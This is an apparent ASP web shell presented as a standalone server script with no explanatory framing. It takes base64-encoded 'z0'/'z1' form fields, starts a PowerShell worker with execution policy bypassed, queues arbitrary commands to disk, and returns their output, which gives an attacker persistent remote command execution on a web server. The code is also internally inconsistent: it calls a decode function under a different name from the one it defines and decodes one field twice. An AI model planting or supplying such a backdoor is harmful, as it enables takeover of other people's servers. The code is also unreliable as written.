<%

Server.CharSet = "UTF-8"
var fso = Server.CreateObject("Scripting.FileSystemObject");

var workDir = Server.MapPath(".");
var queueDir = workDir + "\\.queue";
var outFile = workDir + "\\.output.txt";
var pidFile = workDir + "\\.pid.txt";

if (!fso.FolderExists(queueDir)) {
    fso.CreateFolder(queueDir);
}

function GetCurrentCharset() {
    var charset = this.Response.Charset;

    if (!charset || charset === "") {
        switch (this.Session.CodePage) {
            case 65001: charset = "utf-8"; break;
            case 1252: charset = "windows-1252"; break;
            case 936: charset = "gb2312"; break;
            case 950: charset = "big5"; break;
            case 1251: charset = "windows-1251"; break;
            default: charset = "utf-8";
        }
    }

    return charset;
}

function GetTimestamp() {
    var d = new Date();

    function pad(n) {
        return (n < 10 ? "0" : "") + n;
    }

    return d.getFullYear() +
        pad(d.getMonth() + 1) +
        pad(d.getDate()) + "_" +
        pad(d.getHours()) +
        pad(d.getMinutes()) +
        pad(d.getSeconds());
}

function base64Decode(str, encodingName) {
    if (!str || str === "") return "";

    var bytes = System.Convert.FromBase64String(str);

    var enc = encodingName
        ? System.Text.Encoding.GetEncoding(encodingName)
        : System.Text.Encoding.UTF8;

    return enc.GetString(bytes);
}

var actionType = Base64Decode(Request.Form["z0"]);
var rawZ1 = Base64Decode(Request.Form["z1"]);

if (actionType === "create") {
    var cmd =
        "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"" +
        workDir + "\\worker.ps1\" \"" + workDir + "\"";

    var psi = new System.Diagnostics.ProcessStartInfo("C:\\Windows\\System32\\cmd.exe");

    psi.UseShellExecute = false;
    psi.RedirectStandardOutput = true;
    psi.RedirectStandardError = true;

    psi.Arguments = "/c " + cmd;

    var proc = new System.Diagnostics.Process();
    proc.StartInfo = psi;

    proc.Start();

    var output = proc.StandardOutput.ReadToEnd();
    var error = proc.StandardError.ReadToEnd();

    Response.Write("{\"status\":\"success\"}");

} else if (actionType === "write") {

    var rawCmd = Base64Decode(rawZ1);

    var path = queueDir + "\\" + new Date().getTime() + ".txt";

    var file = fso.CreateTextFile(path, true);
    file.Write(rawCmd);
    file.Close();

    Response.Write("{\"status\":\"queued\"}");
} else if (actionType === "read") {

    var readContent = "";

    if (fso.FileExists(outFile)) {

        var ts = fso.OpenTextFile(outFile, 1, false, -2);
        if (!ts.AtEndOfStream) {
            readContent = ts.ReadAll();
        }
        ts.Close();

        // clear output
        var clear = fso.CreateTextFile(outFile, true);
        clear.Write("");
        clear.Close();
    }

    Response.Write("{\"status\":\"ok\",\"data\":\"" + readContent + "\"}");
} else if (actionType === "stop") {

    if (fso.FileExists(pidFile)) {
        var pid = fso.CreateTextFile(pidFile, true);
        pid.Write("stopped");
        pid.Close();
    }

    Response.Write("{\"status\":\"stopped\"}");
} else {
    Response.Write("{\"status\":\"error\",\"msg\":\"invalid action\"}");
}

%>